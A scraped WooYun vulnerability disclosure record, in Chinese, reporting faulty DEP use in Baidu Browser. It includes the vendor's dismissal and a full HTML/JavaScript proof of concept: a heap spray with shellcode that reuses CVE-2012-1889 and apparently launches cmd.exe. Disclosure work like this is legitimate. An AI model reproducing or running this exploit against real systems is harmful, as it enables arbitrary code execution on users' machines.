{"id": 18655, "wybug_id": "wooyun-2015-0120793", "wybug_title": "百度浏览器数据执行保护漏洞导致任意代码可执行", "wybug_corp": "百度", "wybug_author": "路人甲", "wybug_date": "2015-06-16 10:29", "wybug_open_date": "2015-09-19 10:30", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-21：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向公众公开  简要描述： 百度浏览器DEP开启有误，导致漏洞触发后，无需借助ROP、无需绕过ASLR即可实现shellcode在无可执行属性的内存空间中运行。在windows7等高版本操作系统上，虽然操作系统自身提供了很多漏洞缓解措施，但百度浏览器却没有正确使用，依然存在该问题。 详细说明：  系统版本：windows 7，IE8，未打补丁作为例证，使用IE的历史漏洞来说明： CVE-2012-1889通过IE打开该poc，由于IE8默认开启了DEP，所以会崩溃，shellcode运行失败。但在baidubrowser.exe里能够成功执行shellcode，无需使用ROP绕过DEP。\n\n漏洞触发后：\n\n   漏洞证明：  \n<html><meta http-equiv=\"Cache-Control\" content=\"no-cache\"/><head><script>var arr = new Array();\tfunction Alloc(str, bytes)\t{\t\twhile(str.length < bytes/2)\t\t{\t\t\tstr += str;\t\t}\t\t\t\treturn str.substring(0, (bytes-0x1026)/2);\t}\tfunction Spray()\t{\t\tvar head = \"\\u180c\\u0fe8\\u4141\\u4141\\u4141\\u4141\\u4141\\u4141\\u4141\\u4141\\u4141\\u4141\\u4141\\u4141\\u1828\\u0fe8\";\t\tvar blockBytes = 0x1000;\t\tvar shellcode =\t\"\\u9090\\uec8b\\uec81\\u0100\\u0000\\ua164\\u0030\\u0000\\u588b\\u8b08\\u81f3\\u2cc6\\u0040\\u8b00\\u8936\\u08b5\\uffff\\u64ff\\u30a1\\u0000\\u8b00\\u0c58\\u438b\\u8b0c\\u8b00\\u8b00\\u1858\\u45c7\\u57b0\\u6e69\\uc745\\ub445\\u6578\\u0063\\u758d\\u56b0\\uff53\\u0895\\uffff\\u89ff\\u0c85\\uffff\\uc7ff\\uc445\\u6d63\\u2e64\\u45c7\\u65c8\\u6578\\u6a00\\u8d01\\uc475\\uff56\\u0c95\\uffff\\u00ff\";\t\t\t\tvar padding = \"\\u9090\\u9090\";\t\twhile(padding.length < blockBytes/2)\t\t{\t\t\tpadding = padding + padding;\t\t}\t\t\t\tvar block = padding.substring(0, 0x3f2) + head + shellcode + padding.substring(0, blockBytes/2 - 0x3f2 - head.length - shellcode.length);\t\t\t\t\tvar large = Alloc(block, 0x100000);\t\t\tfor(var k = 0; k < 200; ++k)\t\t{\t\t\tarr[k] = large.substring(0, large.length);\t\t}\t}function call(){\t\tSpray();\t\tvar obj = document.getElementById('poc').object;\t\tvar src = unescape(\"%u1808%u0fe8\");\t\t\t\twhile (src.length < 0x1002) src += src;\t\tsrc = \"\\\\\\\\xxx\" + src;\t\tsrc = src.substr(0, 0x1000 - 10);\t\tvar pic = document.createElement(\"img\");\t\tpic.src = src;\t\tpic.nameProp;\t\tobj.definition(0);}</script></head><body onload='call();'><object classid=\"clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4\" id='poc'></object></body></html>\n   修复方案：  对自身所有进程正确开启DEP   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-09-19 10:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-16 10:39 |    \t\tMieless \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 我是来打酱油的。)\t\t \n  撸过    \n     2015-06-16 11:52 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:10        | 猜猜我是谁？)\t\t \n  前排出售***    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}